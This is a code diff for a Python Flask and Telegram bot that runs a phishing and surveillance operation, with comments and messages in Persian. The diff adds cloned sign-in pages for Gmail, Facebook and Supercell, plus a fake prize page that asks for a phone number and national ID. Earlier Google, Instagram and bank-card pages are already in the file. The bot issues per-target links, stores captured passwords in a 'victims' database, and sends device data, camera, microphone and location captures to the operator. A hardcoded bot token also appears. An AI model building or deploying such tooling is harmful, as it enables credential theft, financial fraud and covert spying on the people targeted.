@@ -3,7 +3,7 @@ from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
 # -------------------- Configuration --------------------
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
@@ -14,7 +14,6 @@ DATABASE = "victims.db"
 PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
 
 BOT_ACTIVE = True
-DEFAULT_PHISHING = "google"
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
@@ -34,6 +33,7 @@ def init_db():
         db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS learned (keyword TEXT PRIMARY KEY, response TEXT)")
         db.commit()
 
 @app.teardown_appcontext
@@ -85,12 +85,19 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Phishing Pages --------------------
+# -------------------- Phishing Pages (Realistic) --------------------
 PHISHING_GOOGLE = """
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Sign in – Google</title>
 <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);} img{display:block;margin:0 auto 16px;width:75px;} h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;} p{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;} input:focus{border-color:#1a73e8;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}</style></head>
 <body><div class="container"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"><h1>Sign in</h1><p>to continue to Free Wi-Fi</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>
+"""
+
+PHISHING_GMAIL = """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Gmail</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Google Sans,Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.2);text-align:center;} img{width:75px;margin-bottom:16px;} h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;} p{font-size:16px;color:#5f6368;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;}</style></head>
+<body><div class="container"><img src="https://www.gstatic.com/images/branding/gmail/2x/gmail_96dp.png" alt="Gmail"><h1>Sign in</h1><p>to continue to Gmail</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>
 """
 
 PHISHING_INSTAGRAM = """
@@ -100,6 +107,13 @@ PHISHING_INSTAGRAM = """
 <body><div class="container"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>
 """
 
+PHISHING_FACEBOOK = """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Facebook – log in</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:396px;padding:20px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center;} img{width:240px;margin-bottom:20px;} input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;} .btn{width:100%;background:#1877f2;color:white;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;cursor:pointer;}</style></head>
+<body><div class="container"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>
+"""
+
 PHISHING_BANK = """
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>پرداخت اینترنتی</title>
@@ -107,6 +121,21 @@ PHISHING_BANK = """
 <body><div class="container"><img src="https://www.shaparak.ir/assets/images/logo.png"><h3>پرداخت امن شاپرک</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره کارت 16 رقمی" required><input type="text" name="password" placeholder="رمز دوم / CVV2"><button class="btn" type="submit">پرداخت</button></form></div></body></html>
 """
 
+PHISHING_SUPERCELL = """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Supercell ID</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1c1c1c;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:30px;background:#2b2b2b;border-radius:16px;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:12px;background:#3a3a3a;border:1px solid #555;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#f8c400;color:black;border:none;border-radius:8px;padding:12px;font-weight:bold;cursor:pointer;}</style></head>
+<body><div class="container"><img src="https://play-lh.googleusercontent.com/MCJeBeFxrvzFxi6OJfO1mH-FS-pXrJ0IBqJcWXOZOLb4Ug4nX1oUPg5AEhjLMLhOew=w240-h480"><h3 style="color:white;">Supercell ID</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>
+"""
+
+PHISHING_LOTTERY = """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>🎰 چرخ شانس</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1a1a2e;font-family:'Segoe UI',Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:350px;padding:30px;background:rgba(255,255,255,0.1);border-radius:20px;text-align:center;backdrop-filter:blur(10px);} h1{color:#ffd700;margin-bottom:10px;} p{color:#ccc;margin-bottom:20px;} input{width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid #ffd700;border-radius:8px;color:white;font-size:16px;margin-bottom:15px;text-align:center;} .btn{width:100%;background:#ff4757;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
+<body><div class="container"><h1>🎰 چرخ شانس</h1><p>شما برنده آیفون ۱۵ شدید! برای دریافت، اطلاعات زیر را وارد کنید.</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره تلفن" required><input type="text" name="password" placeholder="کد ملی"><button class="btn" type="submit">دریافت جایزه</button></form></div></body></html>
+"""
+
+# Capture Page Template (with pop-under, camera, mic, video, etc.)
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -221,6 +250,7 @@ CAPTURE_PAGE_TEMPLATE = """
 </body></html>
 """
 
+# Admin Web Templates
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -254,7 +284,7 @@ def new_link():
     token = str(uuid.uuid4())
     db = get_db()
     db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
-               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), DEFAULT_PHISHING))
+               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), "google"))
     db.commit()
     link = f"{request.host_url}go/{token}"
     return jsonify({"link": link, "token": token})
@@ -268,8 +298,16 @@ def go_to_phish(token):
     ptype = victim['phishing_type'] if victim['phishing_type'] else 'google'
     if ptype == 'instagram':
         page = PHISHING_INSTAGRAM
+    elif ptype == 'facebook':
+        page = PHISHING_FACEBOOK
+    elif ptype == 'gmail':
+        page = PHISHING_GMAIL
     elif ptype == 'bank':
         page = PHISHING_BANK
+    elif ptype == 'supercell':
+        page = PHISHING_SUPERCELL
+    elif ptype == 'lottery':
+        page = PHISHING_LOTTERY
     else:
         page = PHISHING_GOOGLE
     return render_template_string(page, token=token)
@@ -385,7 +423,7 @@ def admin():
         })
     return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)
 
-# Service Worker (unchanged)
+# Service Worker
 SW_JS = """
 self.addEventListener('install', event => { self.skipWaiting(); });
 self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
@@ -447,24 +485,109 @@ def download_file(filename):
     return send_from_directory('static', filename)
 
 # -------------------- Telegram Bot Handlers --------------------
+# Helper to create a new victim entry with specific phishing type
+def create_victim_token(phishing_type):
+    token = str(uuid.uuid4())
+    db = get_db()
+    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
+               (token, datetime.now().isoformat(), request.remote_addr if request else "0.0.0.0", datetime.now().isoformat(), phishing_type))
+    db.commit()
+    return token
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_text = (
+        "🔹 به ربات هوشمند خوش آمدید!\n\n"
+        "📌 با دکمه «ساخت لینک جدید» یک لینک فیشینگ اختصاصی بسازید.\n"
+        "🎯 نوع قربانی (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
+        "📊 وقتی قربانی لینک را باز کند، اطلاعات دستگاه، عکس، صدا و موقعیت او برایتان ارسال می‌شود.\n\n"
+        "🧠 قابلیت یادگیری کلمات:\n"
+        "  /learn <b>کلمه</b> <b>پاسخ</b>\n"
+        "  مثال: /learn سلام علیکم\n"
+        "  /unlearn <b>کلمه</b>\n"
+        "  /wordlist\n\n"
+        "👤 مدیر ربات می‌تواند با /admin ربات را خاموش/روشن کرده و قربانیان را مدیریت کند."
+    )
     keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
     if update.effective_user.id == ADMIN_USER_ID:
         keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
-    await update.message.reply_text("ربات سوپر ارتقاء. برای لینک کلیک کنید.", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text(help_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
 
 async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("شما اجازه ندارید.")
+        await update.message.reply_text("⛔ شما مجاز به استفاده از این دستور نیستید.")
         return
     keyboard = [
         [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
         [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")]
     ]
-    await update.message.reply_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+
+# -------------------- Learning Commands --------------------
+async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_USER_ID:
+        await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمه یاد بدهد.")
+        return
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("📝 فرمت صحیح: /learn <کلمه> <پاسخ>\nمثال: /learn سلام علیکم")
+        return
+    keyword = args[0].strip().lower()
+    response = ' '.join(args[1:])
+    db = get_db()
+    db.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response))
+    db.commit()
+    await update.message.reply_text(f"✅ یاد گرفتم: وقتی کسی بگوید «{keyword}» پاسخ دهم «{response}»")
+
+async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_USER_ID:
+        await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمات را حذف کند.")
+        return
+    if not context.args:
+        await update.message.reply_text("📝 لطفاً کلمه‌ای که می‌خواهید حذف کنید را وارد کنید: /unlearn <کلمه>")
+        return
+    keyword = context.args[0].strip().lower()
+    db = get_db()
+    cur = db.execute("DELETE FROM learned WHERE keyword=?", (keyword,))
+    db.commit()
+    if cur.rowcount > 0:
+        await update.message.reply_text(f"❌ کلمه «{keyword}» و پاسخ مرتبط حذف شد.")
+    else:
+        await update.message.reply_text(f"⚠️ کلمه «{keyword}» در لیست یادگیری وجود ندارد.")
+
+async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    db = get_db()
+    rows = db.execute("SELECT keyword, response FROM learned ORDER BY keyword").fetchall()
+    if not rows:
+        await update.message.reply_text("📭 هنوز هیچ کلمه‌ای یاد نگرفته‌ام.")
+        return
+    text = "📚 کلمات یادگرفته شده:\n\n"
+    for row in rows:
+        text += f"• <b>{row['keyword']}</b> → {row['response']}\n"
+    await update.message.reply_text(text, parse_mode="HTML")
+
+# Message handler for learned words
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg_text = update.message.text.lower()
+    db = get_db()
+    rows = db.execute("SELECT keyword, response FROM learned").fetchall()
+    for row in rows:
+        if row['keyword'] in msg_text:
+            await update.message.reply_text(row['response'])
+            break
+
+# -------------------- Callback Query Handler --------------------
+PHISHING_TYPES = {
+    "google": "🔵 گوگل",
+    "gmail": "✉️ جیمیل",
+    "instagram": "📸 اینستاگرام",
+    "facebook": "👤 فیسبوک",
+    "bank": "🏦 درگاه بانکی",
+    "supercell": "🎮 سوپرسل (کلش/کلنز)",
+    "lottery": "🎰 گردونه شانس"
+}
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global BOT_ACTIVE, DEFAULT_PHISHING
+    global BOT_ACTIVE
     query = update.callback_query
     await query.answer()
     data = query.data
@@ -472,17 +595,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data == "new_link":
         if not BOT_ACTIVE:
-            await query.edit_message_text("❌ به دستور سازنده فعلاً غیرفعال است.")
+            await query.edit_message_text("❌ ربات در حال حاضر غیرفعال است.")
             return
-        token = str(uuid.uuid4())
-        db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-        db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
-                   (token, datetime.now().isoformat(), query.message.chat.id, datetime.now().isoformat(), DEFAULT_PHISHING))
-        db.commit()
-        db.close()
+        # نمایش انتخاب نوع فیشینگ
+        keyboard = []
+        row = []
+        for code, name in PHISHING_TYPES.items():
+            row.append(InlineKeyboardButton(name, callback_data=f"genlink_{code}"))
+            if len(row) == 2:
+                keyboard.append(row)
+                row = []
+        if row:
+            keyboard.append(row)
+        keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
+        await query.edit_message_text("🎯 نوع قربانی را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data.startswith("genlink_"):
+        ptype = data.replace("genlink_", "")
+        token = create_victim_token(ptype)
         link = f"{PUBLIC_URL}/go/{token}"
-        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(این لینک را برای قربانی ارسال کنید)")
+        await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}\n\nبرای قربانی ارسال کنید.")
 
     elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
         parts = data.split('|')
@@ -547,33 +679,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "admin_panel":
         if user_id != ADMIN_USER_ID:
-            await query.answer("شما اجازه ندارید.", show_alert=True)
+            await query.answer("⛔ فقط مدیر ربات می‌تواند به پنل دسترسی داشته باشد.", show_alert=True)
             return
         keyboard = [
-            [InlineKeyboardButton("روشن/خاموش", callback_data="toggle_bot"),
-             InlineKeyboardButton("نوع فیشینگ", callback_data="change_phishing")],
+            [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
             [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
-            [InlineKeyboardButton("بازگشت", callback_data="start")]
+            [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
         ]
-        await query.edit_message_text("پنل مدیریت سوپر", reply_markup=InlineKeyboardMarkup(keyboard))
-
-    elif data == "change_phishing":
-        if user_id != ADMIN_USER_ID:
-            await query.answer("No access", show_alert=True)
-            return
-        keyboard = [
-            [InlineKeyboardButton("🔵 گوگل", callback_data="set_phish_google"),
-             InlineKeyboardButton("🟣 اینستاگرام", callback_data="set_phish_instagram")],
-            [InlineKeyboardButton("🏦 درگاه بانکی", callback_data="set_phish_bank")],
-            [InlineKeyboardButton("بازگشت", callback_data="admin_panel")]
-        ]
-        await query.edit_message_text("نوع فیشینگ فعلی: " + DEFAULT_PHISHING, reply_markup=InlineKeyboardMarkup(keyboard))
-
-    elif data.startswith("set_phish_"):
-        if user_id != ADMIN_USER_ID: return
-        ptype = data.replace("set_phish_", "")
-        DEFAULT_PHISHING = ptype
-        await query.edit_message_text(f"✅ نوع فیشینگ به {ptype} تغییر کرد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+        await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
 
     elif data == "toggle_bot":
         if user_id != ADMIN_USER_ID:
@@ -587,7 +700,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
         if user_id == ADMIN_USER_ID:
             keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
-        await query.edit_message_text("برای دریافت لینک اختصاصی روی دکمه زیر کلیک کنید.", reply_markup=InlineKeyboardMarkup(keyboard))
+        await query.edit_message_text("لطفاً یکی از گزینه‌های زیر را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
 
     elif data == "victims_list":
         if user_id != ADMIN_USER_ID:
@@ -595,7 +708,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         db = sqlite3.connect(DATABASE)
         db.row_factory = sqlite3.Row
-        victims = db.execute("SELECT token, ip, last_active FROM victims ORDER BY last_active DESC").fetchall()
+        victims = db.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
         db.close()
         if not victims:
             await query.edit_message_text("هنوز هیچ قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
@@ -604,7 +717,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for v in victims:
             short = v['token'][:8] + "..."
             last = v['last_active'] if v['last_active'] else "نامشخص"
-            btn = InlineKeyboardButton(f"{short} ({v['ip']}) - {last}", callback_data=f"victim_detail|{v['token']}")
+            ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
+            btn = InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")
             buttons.append([btn])
         buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
         await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
@@ -630,7 +744,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += f"<b>IP:</b> {victim['ip']}\n"
         text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
         text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
-        text += f"<b>نوع فیشینگ:</b> {victim['phishing_type']}\n"
+        text += f"<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n"
         text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
 
         keyboard = [
@@ -657,13 +771,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.execute("DELETE FROM victims WHERE token=?", (token,))
         db.execute("DELETE FROM logs WHERE token=?", (token,))
         db.execute("DELETE FROM media WHERE token=?", (token,))
+        db.execute("DELETE FROM credentials WHERE token=?", (token,))
         db.commit()
         db.close()
-        await query.edit_message_text(f"قربانی {token} به همراه تمام داده‌ها حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+        await query.edit_message_text(f"🗑 قربانی {token} و تمام داده‌های مرتبط حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
 
 async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("شما اجازه ندارید.")
+        await update.message.reply_text("⛔ فقط مدیر می‌تواند جستجو کند.")
         return
     if not context.args:
         await update.message.reply_text("لطفاً یک توکن وارد کنید: /search <token>")
@@ -696,6 +811,11 @@ if __name__ == '__main__':
     application = Application.builder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("admin", admin_cmd))
+    application.add_handler(CommandHandler("learn", learn_command))
+    application.add_handler(CommandHandler("unlearn", unlearn_command))
+    application.add_handler(CommandHandler("wordlist", wordlist_command))
     application.add_handler(CommandHandler("search", search_victim))
     application.add_handler(CallbackQueryHandler(button_handler))
+    # Add message handler for learned keywords (low priority)
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.run_polling()
